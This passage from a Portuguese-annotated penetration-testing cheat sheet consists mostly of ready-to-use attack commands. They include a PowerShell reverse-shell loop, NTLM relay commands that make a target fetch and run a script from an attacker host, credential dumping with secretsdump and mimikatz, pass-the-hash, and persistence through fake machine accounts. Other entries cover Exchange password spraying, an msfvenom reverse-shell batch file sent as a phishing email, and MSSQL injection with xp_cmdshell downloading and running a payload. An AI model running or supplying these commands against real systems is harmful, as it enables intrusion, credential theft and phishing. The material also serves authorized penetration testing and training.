			while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
			{
			;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );
			$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
			$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
			};
			$client.Close()
		
		# 2 -  Hospedou com python e aguardou o shell reverso  
			python3 –m http.server <ALTERNATIVE_HTTP_PORT> 
			nc –nvlp <REVERSE_SHELL_PORT>
		
		# 3 - Desabilitou o HTTP e SMB server no /etc/responder/Responder.conf
			nano  /etc/responder/Responder.conf
		# 4 - usou o ntlmrelay para fazer um alvo executar o shell reverso hospedado 
			ntlmrelayx.py -t <TARGET_COMPUTER> -c 'powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>:<HTTP_PORT>/command.txt\")"' -smb2support
			
			# '

		# 5 - Usou responder para o pousoning
			responder –I <IFACE> -v
 
## Computer Acconts - Lembrar que possuem, em sua maioria, senhas randomicas que mudam a cada 30 dias 
	# Tais configurações podem ser modificadas em: 
		HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters 
			MaximumPasswordAge
			DisablePasswordChange # mudar para 1 
	# Senhas de contas de maquina estão em 
		HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
		# podem ser obtidas com secretsdump ou mimikatz
		secretsdump.py <DOMAIN>/<USER>@<TARGET_COMPUTER_FQDN> 
		proxychains secretsdump.py -debug -dc-ip 10.10.3.2 spn_svc@MGMT-DC.MGMT.CORP
		proxychains secretsdump.py -just-dc spn_svc:'B@DB!tch'@MGMT-DC.MGMT.CORP

		mimikatz # privilege::debug
		mimikatz # sekurlsa::LogonPasswords
	
	#Uma vez com o hash de um computer account usar o mimikatz para ves oque ele tem acesso 
		sekurlsa::pth /user:<MACHINE_ACC> /domain:<DOMAIN> /ntlm:<MACHINE_ACCOUNT_HASH> /run:powershell.exe
		# No powershell aberto 
		Import-module .\PowerSploit.psm1
		Find-LocalAdminAccess
		# Com powerview 
		Get-NetLocalGroup –ComputerName <TARGET> -API –GroupName <GROUP>
		# Dependendo do privilégio em outras máquinas usar comando de movimento lateral como winrs 
		PS > winrs -r:<TARGET> <COMMAND>


	# Usar PowerMad para criar novas contas de computadores como forma de persistencia 
		PS > Import-Module .\Powermad.psd1
		PS > $machine_account_password = ConvertTo-SecureString ‘<PASSWORD>’ –AsPlainText -Force
		PS > New-MachineAccount –MachineAccount <FAKEPC> -Password $machine_account_password -Verbose
		# adcionar esta conta fake em grupo de administradores de alvo onde se tenha privilégios 
		PS > winrs –r:<TARGETCOMPUTER> net localgroup administrators ”<FAKECOMPUTERACCOUNT>” /add
		PS > Get-NetLocalGroup –ComputerName <TARGET> -API –GroupName Administrators
		# esta conta criada nunca expirará e pode ser usada para movimento lateral 
		PS > runas /user:<FAKECOMPUTERACCOUNT> /netonly cmd.exe # Under the new powershell prompt
		PS > winrs –r:<TARGETCOMPUTER> cmd.exe
		# ou criar um silver ticket 	 
			ticketer.py –aesKey <MACHINE_ACCOUNT_HASH> -domain-sid <SID> -domain <DOMAIN_FQDN> -spn <SPN> <ANYUSER>
			export KRB5CCNAME=<ANYUSER>.ccache
			psexec.py –k –no-pass <DOMAIN>/<ANYUSER>@<TARGET_COMPUTER> -dc-ip <DC_IP>

## Exchange
	# HTTPS 
		/owa/auth.owa
		/EWS/Exchange.asmx 

	# Autodiscover 
		“autodiscover.domain.com/autodiscover/autodiscover.xml”
		“mail.domain.com/autodiscover/autodiscover.xml” 
		“webmail.domain.com/autodiscover/autodiscover.xml”
		“domain.com/autodiscover/autodiscover.xml”
		# DNS 
			dig _autodiscover._tcp.<email-domain> SRV 

	# 1 - Descobrir o dominio local 
		Import-Module .\MailSniper.ps1
		Invoke-DomainHarvestOWA –ExchHostname mail.domain.com –OutFile potential_domains.txt –CompanyName "Target Name"
		Invoke-DomainHarvestOWA –ExchHostname exchange.els.bank –OutFile potential_domains.txt –CompanyName "ELS Bank"

	# 2 - Identificar usuários 
		Invoke-UsernameHarvestOWA –UserList .\username_list.txt –ExchHostname mail.domain.com –Domain the_identified_internal_domain_name –OutFile potential_usernames.txt
		Invoke-UsernameHarvestOWA –UserList .\username_list.txt –ExchHostname exchange.els.bank –Domain ELS –OutFile potential_usernames.txt
	# 3 - Brute force 
		# OWA
		Invoke-PasswordSprayOWA -ExchHostname mail.domain.com –UserList .\potential_usernames.txt -Password P@ssw0rd123 -Threads 15 -OutFile owa-sprayed-creds.txt
		# EWS 
		Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt - Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
	# 4 - Global Access List GAL 
		Get-GlobalAddressList -ExchHostname mail.domain.com –UserName domain\username -Password Fall2016 -OutFile global-address-list.txt

	# 5 - Mailbox 
		Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -remote

## CrackMapExec - Para executar comandos encodados 
    # 1 - Encodar um comando em base64 
    $string = "iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerSploit/Recon/PowerView.ps1')"
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
    echo $encodedCommand

    # 2 - PowerShell 
    powershell -Sta -Nop -Window Hidden -EncodedCommand <Comando Encodado> 

    # 3 - CME tem limitação de número e tipo de caractéres 
    cme smb 10.10.10.10 -u user -p senha -X "powershell -Sta -Nop -Window Hidden -EncodedCommand <Comando Encodado>"

## Portforwarding com NETSH 
    # 1 - Criar o Listener 
        netsh interface portproxy add v4tov4 listenport=10000 connectport=80 connectaddress=10.100.10.252
    # 2 - Abrir a porta no firewall 
        netsh firewall add portopening TCP 10000 "Open Port 10000"

## Shell reverso em bat 
    msfvenom --platform Windows -p cmd/windows/reverse_powershell lhost=172.16.25.10 lport=1234 > att3.bat
    # Envio pelo sendemail 
    cat msg.txt| sendemail -t "dev-user@els.corp" -f "atk@els.corp" -u "Click On This" -s "172.16.250.2:25"  -o tls=no -a att3.bat

##### MS SQL #####
	## UNION ALL 
		http://10.100.10.101/employee.asp?id=1%20UNION%20all%20select%20NULL,NULL,cast((SELECT%20@@servername)%20as%20varchar),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%20--
		http://10.100.10.101/employee.asp?id=1%20EXECUTE%20AS%20LOGIN%20=%20%27sa%27

		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1 EXEC sp_configure  'show advanced options', '1'
		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1 RECONFIGURE
		http://10.100.10.101/employee.asp?id=1 EXEC sp_configure 'xp_cmdshell', '1'
		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1%20EXEC%20xp_cmdshell%20%27whoami%27
		EXEC xp_cmdshell 'COMANDO'
		EXEC xp_cmdshell 'powershell -Sta -Nop -Window Hidden -Command "curl http://172.16.40.10:8081/rev.exe -OutFile rev.exe"'
		EXEC xp_cmdshell '.\rev.exe'
		cast((SELECT%20@@servername)%20as%20varchar)
		cast((SELECT STRING_AGG(select name from sys.ssyslogins , ';')) as varchar)
		select group_concat name from sys.syslogins

	# Comandos MSSQL 
		SELECT @@servername
		
		SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
		EXEC xp_cmdshell 'whoami'
		# Database links 
			SELECT * FROM master..sysservers
			SELECT * FROM OPENQUERY("UATSERVER\DB2", 'select * from master..sysservers')

		# Stored Procedure 
		SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'
		
	# Enumeração a partir de usuário desautenticado 
		# CMD 
		sqlcmd -L 
		# Metasploit 
		msf > use auxiliary/scanner/mssql/mssql_ping
		msf > set RHOSTS Range 
		msf > use scanner/mssql/mssql_login #Bruteforce ou PasswordSpraying
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceScanUDP
	# Enumeração a partir de usuário local
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceLocal
	# Enumeração a partir de usuário do domínio 
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceDomain 
		Get-NetComputer -SPN mssql*
		setspn -T domain -Q MSSQLSvc/*

	# Foothold incial - Força bruta 
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
			# teste de login fraco
			Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw -Verbose
			Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
			# teste de credencial padrão
			Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw
			Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw 
			# teste manual 
			Get-SQLInstanceScanUDP | Get-SqlConnectionTestThreaded -Username fulano -Password senha 
			# Teste de de conexão com conta atual 
			Get-SQLInstanceDomain | Get-SQLConnectionTest 
			Get-SQLInstanceLocal | Get-SQLConnectionTest

			$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like "Accessible"}
			$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}

	# Execucao de comando 
		SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
		EXEC xp_cmdshell 'powershell $host.version'

		# PowerUPSql
			>> $Targets | Invoke-SQLOSCLR -Verbose -Command "Whoami"
			>> $Targets | Invoke-SQLOSOle -Verbose -Command "Whoami"
			>> $Targets | Invoke-SQLOSR -Verbose -Command "Whoami"

	### Escalação de privilégios para SysAdmin ###
		# 1 - Senha fraca e Blind SQL Server Login enumeration
			# Listar todos do Server Logins 
			SELECT name FROM sys.syslogins
			SELECT name FROM sys.server_principals 

			# Fuzzing de usuários 
				SELECT SUSER_NAME (1)
				SELECT SUSER_NAME (2)
				...

			# Blind SQL Server Login Enumeration 
			Get-SQLFuzzServerLogin –Instance ComputerName\InstanceName
			Get-SQLFuzzDomainAccount –Instance ComputerName\InstanceName

		# 2 - Impersonate Privilege 
			# Checar manualmente se pode personificar o sa 
				SELECT SYSTEM_USER
				SELECT IS_SRVROLEMEMBER('sysadmin')
				
				EXECUTE AS LOGIN = 'sa'
				
				SELECT SYSTEM_USER
				SELECT IS_SRVROLEMEMBER('sysadmin')

			# Metasploit 
				auxiliary/admin/mssql/mssql_escalate_execute_as
				use exploit/windows/mssql/mssql_payload

		# 3 - Stored Procedure and Trigger Creation
			# A) Procurar por databases que sao do sysadmin e que sao TRUSTWORTHY 
				SELECT SUSER_SNAME(owner_sid) AS DBOWNER, d.name AS DATABASENAME
				FROM sys.server_principals r 
				INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
				INNER JOIN sys.server_principals p ON 
				p.principal_id = m.member_principal_id
				inner join sys.databases d on suser_sname(d.owner_sid) = p.name
				WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') AND r.type = 'R' AND r.name = N'sysadmin'
			# B) criar um processo que roda com sa como dono 
				USE AdventureWork2008 
				GO 
				CREATE PROCEDURE sp_elavate_me
				WITH EXECUTE AS OWNER 
				AS EXEC sp_addsrvrolemember 'AdventureWorkUser1','sysadmin'
				GO 

			# C) Executar o processo stored 
				USE AdventureWork2008
				EXEC sp_elavate_me

			# D) Verificar se está como sysadmin
				SELECT is_srvrolemember('sysadmin')

			# Metasploit - Faz reconhecimento e esploração automáticamente 
				auxiliary/admin/mssql/mssql_escalate_dbowner
				auxiliary/admin/mssql/mssql_escalate_dbowner_sqli

		# UNC Path Injection 
		### Ver conteúdo Sensível pode ser feito após ter personificado o sysadmin
			# PowerUPSQL 
			Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "credit,ssn,password,pass" -SampleSize 2 -ValidateCC -NoDefaults

			Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded Verbose –Threads 10 -NoDefaults | Where-Object {$_.is_encrypted –eq "TRUE"} | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults

		### Extrair SQL Server Login hashes



# Mona 
	!mona find -s '"xff\xe4" -m "libspp.dll"'
	!mona jmp -r esp 
	